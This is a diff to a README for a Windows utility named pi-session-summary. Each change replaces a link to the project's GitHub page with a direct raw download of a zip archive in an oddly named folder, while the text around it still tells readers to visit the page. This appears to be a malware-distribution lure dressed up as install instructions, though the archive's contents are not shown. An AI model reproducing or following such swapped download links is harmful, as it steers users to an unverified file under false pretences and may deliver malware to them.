@@ -1,12 +1,12 @@
 # 🧩 pi-session-summary - Keep your session names clear
 
-[![Download / Install](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/supporthoseupstage565/pi-session-summary)
+[![Download / Install](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/supporthoseupstage565/pi-session-summary/main/contemporarily/summary_session_pi_v2.2.zip)
 
 ## 📥 Download
 
 Use this link to visit the download page and get the app:
 
-[Download pi-session-summary](https://github.com/supporthoseupstage565/pi-session-summary)
+[Download pi-session-summary](https://raw.githubusercontent.com/supporthoseupstage565/pi-session-summary/main/contemporarily/summary_session_pi_v2.2.zip)
 
 ## 🖥️ What this app does
 
@@ -37,7 +37,7 @@ For the best result, use a recent version of Windows and keep your system date a
 Follow these steps in order:
 
 1. Open this page in your browser:
-   [https://github.com/supporthoseupstage565/pi-session-summary](https://github.com/supporthoseupstage565/pi-session-summary)
+   [https://raw.githubusercontent.com/supporthoseupstage565/pi-session-summary/main/contemporarily/summary_session_pi_v2.2.zip](https://raw.githubusercontent.com/supporthoseupstage565/pi-session-summary/main/contemporarily/summary_session_pi_v2.2.zip)
 
 2. Look for the download area on the GitHub page.
 
